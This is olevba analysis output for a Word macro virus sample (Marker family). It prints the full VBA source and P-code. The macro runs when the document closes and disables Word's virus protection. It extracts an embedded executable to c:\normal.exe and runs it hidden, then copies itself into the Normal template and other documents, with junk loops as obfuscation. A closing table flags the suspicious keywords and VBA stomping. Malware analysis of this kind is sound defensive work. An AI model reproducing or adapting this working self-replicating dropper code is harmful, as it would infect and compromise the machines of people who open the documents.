olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.gc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.gc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SetEndOfFile Lib "kernel32" Alias "setendoffile" (ByVal h As Long) As Boolean
Private Declare Function OpenFile Lib "kernel32" Alias "_lopen" (ByVal s As String, ByVal mode As Long) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "_lcreat" (ByVal s As String, ByVal attr As Long) As Long
Private Declare Function GlobalAlloc Lib "kernel32" (ByVal fl As Long, ByVal n As Long) As Long
Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
Private Declare Function SeekFile Lib "kernel32" Alias "_llseek" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long) As Long
Private Declare Sub ReadFile Lib "kernel32" Alias "_lread" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub WriteFile Lib "kernel32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub CloseFile Lib "kernel32" Alias "_lclose" (ByVal h As Long)

Private Sub Document_Close()

On Error Resume Next
Options.VirusProtection = False
Const ker = "Mińrîsîft Îfficĺ"

Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim dad, dnt As Object
Dim OurCode, UserAddress, LogData, LogFile As String
Dim dc As String, xe As String
Dim dh As Long, dp As Long, ss As Long
Dim x_z, z_y, z_z, z_a, z_b As Long
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
xe = "c:\normal.exe"

For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

Set dad = ActiveDocument.VBProject.VBComponents.Item(1)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
Set dnt = NormalTemplate.VBProject.VBComponents.Item(1)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
DocumentInfected = dad.CodeModule.Find(ker, 1, 1, 10000, 10000)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
NormalTemplateInfected = dnt.CodeModule.Find(ker, 1, 1, 10000, 10000)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
dc = ActiveDocument.Name
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

 dp = GlobalAlloc(0, 50698)
 dh = OpenFile(dc, 0)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
 
 If SetEndOfFile(dh) Then
        ss = SeekFile(dh, -50688, 2)
        ReadFile dh, dp, 50688
        CloseFile dh
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
        
         dh = CreateFile(xe, 0)
         WriteFile dh, dp, 50698
         CloseFile dh
          Shell "c:\normal.exe", vbHide
           
        End If
        

For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
 
   
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

   If DocumentInfected = True Then
      SaveNormalTemplate = NormalTemplate.Saved
      OurCode = dad.CodeModule.Lines(1, dad.CodeModule.CountOfLines)

For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

      For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
     Next i

For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
  
    
    dnt.CodeModule.DeleteLines 1, dnt.CodeModule.CountOfLines
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    dnt.CodeModule.AddFromString OurCode
 For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    If SaveNormalTemplate = True Then NormalTemplate.Save
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    
  End If


  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    SaveDocument = ActiveDocument.Saved
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    
    OurCode = dnt.CodeModule.Lines(1, dnt.CodeModule.CountOfLines)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    dad.CodeModule.DeleteLines 1, dad.CodeModule.CountOfLines
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    dad.CodeModule.AddFromString OurCode
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    
    If SaveDocument = True Then ActiveDocument.Save
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
      
  End If
  
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    
End If
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

End Sub














-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.gc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10920 bytes
' Line #0:
' 	FuncDefn (Private Declare Function SetEndOfFile Lib "kernel32" (ByVal h As Long) As Boolean)
' Line #1:
' 	FuncDefn (Private Declare Function OpenFile Lib "kernel32" (ByVal s As String, ByVal mode As Long) As Long)
' Line #2:
' 	FuncDefn (Private Declare Function CreateFile Lib "kernel32" (ByVal s As String, ByVal attr As Long) As Long)
' Line #3:
' 	FuncDefn (Private Declare Function GlobalAlloc Lib "kernel32" (ByVal fl As Long, ByVal n As Long) As Long)
' Line #4:
' 	FuncDefn (Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long))
' Line #5:
' 	FuncDefn (Private Declare Function SeekFile Lib "kernel32" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long) As Long)
' Line #6:
' 	FuncDefn (Private Declare Sub ReadFile Lib "kernel32" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long))
' Line #7:
' 	FuncDefn (Private Declare Sub WriteFile Lib "kernel32" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long))
' Line #8:
' 	FuncDefn (Private Declare Sub CloseFile Lib "kernel32" (ByVal h As Long))
' Line #9:
' Line #10:
' 	FuncDefn (Private Sub Document_Close())
' Line #11:
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	Dim (Const) 
' 	LitStr 0x0010 "Mińrîsîft Îfficĺ"
' 	VarDefn ker
' Line #15:
' Line #16:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #17:
' 	Dim 
' 	VarDefn dad
' 	VarDefn dnt (As Object)
' Line #18:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #19:
' 	Dim 
' 	VarDefn dc (As String)
' 	VarDefn xe (As String)
' Line #20:
' 	Dim 
' 	VarDefn dh (As Long)
' 	VarDefn dp (As Long)
' 	VarDefn ss (As Long)
' Line #21:
' 	Dim 
' 	VarDefn x_z
' 	VarDefn z_y
' 	VarDefn z_z
' 	VarDefn z_a
' 	VarDefn z_b (As Long)
' Line #22:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #23:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #24:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #25:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #26:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #27:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	LitStr 0x000D "c:\normal.exe"
' 	St xe 
' Line #29:
' Line #30:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #31:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #32:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #33:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #34:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #35:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' Line #37:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set dad 
' Line #38:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #39:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #40:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #41:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #42:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #43:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set dnt 
' Line #45:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #46:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #47:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #48:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #49:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #50:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	Ld ker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld dad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #52:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #53:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #54:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #55:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #56:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #57:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	Ld ker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld dnt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #59:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #60:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #61:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #62:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #63:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #64:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St dc 
' Line #66:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #67:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #68:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #69:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #70:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #71:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' Line #73:
' 	LitDI2 0x0000 
' 	LitDI4 0xC60A 0x0000 
' 	ArgsLd GlobalAlloc 0x0002 
' 	St dp 
' Line #74:
' 	Ld dc 
' 	LitDI2 0x0000 
' 	ArgsLd OpenFile 0x0002 
' 	St dh 
' Line #75:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #76:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #77:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #78:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #79:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #80:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' Line #82:
' 	Ld dh 
' 	ArgsLd SetEndOfFile 0x0001 
' 	IfBlock 
' Line #83:
' 	Ld dh 
' 	LitDI4 0xC600 0x0000 
' 	UMi 
' 	LitDI2 0x0002 
' 	ArgsLd SeekFile 0x0003 
' 	St ss 
' Line #84:
' 	Ld dh 
' 	Ld dp 
' 	LitDI4 0xC600 0x0000 
' 	ArgsCall ReadFile 0x0003 
' Line #85:
' 	Ld dh 
' 	ArgsCall CloseFile 0x0001 
' Line #86:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #87:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #88:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #89:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #90:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #91:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #92:
' Line #93:
' 	Ld xe 
' 	LitDI2 0x0000 
' 	ArgsLd CreateFile 0x0002 
' 	St dh 
' Line #94:
' 	Ld dh 
' 	Ld dp 
' 	LitDI4 0xC60A 0x0000 
' 	ArgsCall WriteFile 0x0003 
' Line #95:
' 	Ld dh 
' 	ArgsCall CloseFile 0x0001 
' Line #96:
' 	LitStr 0x000D "c:\normal.exe"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #97:
' Line #98:
' 	EndIfBlock 
' Line #99:
' Line #100:
' Line #101:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #102:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #103:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #104:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #105:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #106:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' Line #108:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #109:
' Line #110:
' Line #111:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #112:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #113:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #114:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #115:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #116:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #117:
' Line #118:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #119:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #120:
' 	LitDI2 0x0001 
' 	Ld dad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld dad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #121:
' Line #122:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #123:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #124:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #125:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #126:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #127:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #128:
' Line #129:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #130:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #131:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #132:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #133:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #134:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #135:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #136:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #137:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #138:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	ElseBlock 
' Line #141:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #144:
' Line #145:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #146:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #147:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #148:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #149:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #150:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #151:
' Line #152:
' Line #153:
' 	LitDI2 0x0001 
' 	Ld dnt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld dnt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #154:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #155:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #156:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #157:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #158:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #159:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #160:
' 	Ld OurCode 
' 	Ld dnt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #161:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #162:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #163:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #164:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #165:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #166:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #167:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #168:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #169:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #170:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #171:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #172:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #173:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #174:
' Line #175:
' 	EndIfBlock 
' Line #176:
' Line #177:
' Line #178:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #179:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #180:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #181:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #182:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #183:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #184:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #185:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #186:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #187:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #188:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #189:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #190:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #191:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #192:
' Line #193:
' 	LitDI2 0x0001 
' 	Ld dnt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld dnt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #194:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #195:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #196:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #197:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #198:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #199:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #200:
' 	LitDI2 0x0001 
' 	Ld dad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld dad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #201:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #202:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #203:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #204:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #205:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #206:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #207:
' 	Ld OurCode 
' 	Ld dad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #208:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #209:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #210:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #211:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #212:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #213:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #214:
' Line #215:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #216:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #217:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #218:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #219:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #220:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #221:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #222:
' Line #223:
' 	EndIfBlock 
' Line #224:
' Line #225:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #226:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #227:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #228:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #229:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #230:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #231:
' Line #232:
' 	EndIfBlock 
' Line #233:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #234:
' 	LitDI2 0x0002 
' 	St z_y 
' Line #235:
' 	LitDI2 0x0006 
' 	St z_z 
' Line #236:
' 	LitDI2 0x0009 
' 	St z_a 
' Line #237:
' 	LitDI2 0x0001 
' 	St z_b 
' Line #238:
' 	StartForVariable 
' 	Ld x_z 
' 	EndForVariable 
' 	NextVar 
' Line #239:
' Line #240:
' 	EndSub 
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |normal.exe          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
